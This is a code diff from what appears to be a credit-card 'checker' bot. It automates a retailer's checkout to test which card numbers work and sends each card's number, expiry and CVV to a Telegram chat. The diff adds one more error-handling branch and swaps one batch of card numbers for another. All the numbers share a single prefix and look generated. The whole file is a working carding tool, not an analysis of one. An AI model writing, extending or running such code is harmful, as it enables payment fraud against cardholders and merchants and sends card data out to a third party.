@@ -199,10 +199,16 @@ def livear(cc_namso):
 
     elif bot.locate('error1', click=False):
         print('There was a problem processing your card. Please call your card issuer or try a different card.')
-        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]}\nCVV: {cc[3]}\n\n📝 Details:\nThere was a problem processing your card. Please call your card issuer or try a different card.", '-726102881')
+        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nThere was a problem processing your card. Please call your card issuer or try a different card.", '-726102881')
     elif bot.locate('out_funds', click=False):
         print('Your card appears to be out of funds. Please try a new one.')
-        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]}\nCVV: {cc[3]}\n\n📝 Details:\nYour card appears to be out of funds. Please try a new one.", '-726102881')
+        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nYour card appears to be out of funds. Please try a new one.", '-726102881')
+    elif bot.locate('enable_to_ad', click=False):
+        print("Unable to add payment method. Please try again.")
+        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nUnable to add payment method. Please try again.", '-726102881')
+        preparar_worksplace()
+
+    
 
     
 # Logica
@@ -210,16 +216,16 @@ def livear(cc_namso):
 def main():
 
     ccs = """
-5217295329214138|11|2023|724
-5217295329225621|11|2023|401
-5217295329226728|11|2023|124
-5217295329267854|11|2023|370
-5217295329215564|11|2023|170
-5217295329218147|11|2023|385
-5217295329282010|11|2023|331
-5217295329220150|11|2023|432
-5217295329288801|11|2023|232
-5217295329241073|11|2023|354
+5217295329243582|11|2023|466
+5217295329261741|11|2023|682
+5217295329216257|11|2023|346
+5217295329254076|11|2023|643
+5217295329282465|11|2023|387
+5217295329210516|11|2023|612
+5217295329247765|11|2023|443
+5217295329282887|11|2023|578
+5217295329242733|11|2023|503
+5217295329257665|11|2023|083
     """
 
     preparar_worksplace()
